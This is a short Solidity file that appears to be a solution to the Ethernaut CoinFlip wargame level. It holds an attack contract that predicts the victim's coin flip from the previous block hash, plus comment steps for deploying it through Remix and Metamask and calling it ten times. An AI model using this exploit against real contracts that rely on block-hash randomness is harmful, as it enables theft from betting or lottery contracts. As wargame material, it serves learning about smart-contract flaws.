// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public victimContract;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddr) public {
        victimContract = CoinFlip(_victimContractAddr);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue / FACTOR);
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
    }
}

//
// we need to copy contract above in Remix and create another smart contract that will be almost the same
// lets name our attacking smart contract 'CoinFlipAttack.sol'
//
// than we need to:
// 1. get smart contract address from task (Ethernaut) page ( contract.address )
// 2. switch environment to 'Injected provider - Metamask'
// 3. deploy CoinFlipAttack.sol with address from (1) as a parameter
// 4. call flip() method 10 times
//
